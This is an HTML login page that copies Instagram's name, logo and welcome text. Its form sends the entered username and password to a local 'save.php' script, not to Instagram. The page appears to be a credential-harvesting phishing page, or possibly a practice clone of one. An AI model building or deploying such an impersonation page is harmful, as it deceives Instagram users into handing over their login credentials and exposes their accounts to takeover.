<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Instagram | Login Account </title>
    <link rel="icon" href="instagram.png">
    <style>
        *
        {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body
        {
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background: linear-gradient(45deg,red,violet);     
        }
        .form
        {
            width: 45%;
            height: 80%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 50px;
            border: 2px solid white;
            background-color: white;
            border-radius: 30px;
        }
        .form input
        {
            padding: 10px;
            font-size: 20px;
            outline: none;
            color: rgba(255,255,255,.8);
            text-align: center;
            border-radius: 25px;
            border: 1px solid white;
            margin-top: 10px;
            background-color: black;
        }
        #btn
        {
            width: 40vh;
            padding: 5px;
            height: 7.5vh;
            font-family: cursive;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            color: white;
            background: linear-gradient(45deg,violet,red);
        }
        h2
        {
            color: red;
            font-family: sans-serif;
            font-size: 38px;
            text-align: center;
        }
        h3
        {
            font-family: sans-serif;
            font-size: 35px;
            -webkit-text-stroke: 2px red;
            color: transparent;
        }
        h2:hover
        {
            -webkit-text-stroke: 2.5px rgba(255,0,0,.6);
            color: transparent;
            font-size: 39px;
        }
        p
        {
            color: rgba(0,0,0,.7);
            font-family: cursive;
            font-size: 20px;
        }
        .form img
        {
            width: 100px;
            height: 100px;
            border: 2px solid white;
            border-radius: 25%;
            margin-top: -120px;
        }
        video
        {
            position: absolute;
            right: 0;
            bottom: 0;
            z-index: -1;
        }
        a
        {
            text-decoration: none;
            font: 14px cursive;
            color: rgba(255,0,0,.7);
            text-align: center;
            padding: 4px 0px 0px 0px;
        }
    </style>
</head>
<body>
    <video autoplay loop muted plays-inline src="red.mp4"></video>
    <div class="form">
    <img src="instagram.png">
    <br>
        <h2> Welcome to Instagram</h2>
        <p>login to enter world</p>
        <br>
        <form action="save.php" method="post">
            <input type="text" name="user" placeholder="Username" required>
            <br>
            <input type="password" name="pass" placeholder="Password" required>
            <br>
            <br>
            <input type="hidden" name="num" value=5 >
            <input type="submit" id="btn" value="login">
    </form>
    <a href="forget.php">forget password</a>
        <h3>or</h3>
        <form action="createAc.php">
            <input id="btn" type="submit" value="signup">
        </form>
    </div>
</body>
</html>